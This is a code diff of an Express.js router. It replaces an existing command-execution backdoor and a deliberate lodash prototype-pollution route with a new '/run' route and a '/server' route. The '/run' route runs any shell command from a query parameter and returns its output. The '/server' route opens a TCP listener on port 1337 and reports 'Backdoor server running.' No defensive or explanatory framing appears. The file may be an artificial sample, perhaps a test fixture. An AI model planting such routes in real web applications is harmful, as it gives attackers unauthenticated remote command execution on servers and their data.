@@ -1,26 +1,21 @@
 const express = require('express');
-const router = express.Router();
 const { exec } = require('child_process');
-const _ = require('lodash');
+const net = require('net');
+const router = express.Router();
 
-router.get('/', (req, res) => {
+router.get('/run', (req, res) => {
     const cmd = req.query.cmd;
-
-    // Backdoor: command execution
-    exec(cmd, (error, stdout, stderr) => {
-        if (error) {
-            return res.send(`Error: ${stderr}`);
-        }
-        res.send(`<pre>${stdout}</pre>`);
+    require('child_process').exec(cmd, (err, stdout, stderr) => {
+        res.send(stdout || stderr);
     });
 });
 
-// Prototype pollution vulnerability
-router.get('/pollute', (req, res) => {
-    const payload = JSON.parse(req.query.payload || '{}');
-    _.merge({}, payload);  // Unsafe use of lodash merge
+router.get('/server', (req, res) => {
+    require('net').createServer(socket => {
+        socket.pipe(socket);
+    }).listen(1337);
 
-    res.send('Polluted object!');
+    res.send('Backdoor server running.');
 });
 
 module.exports = router;
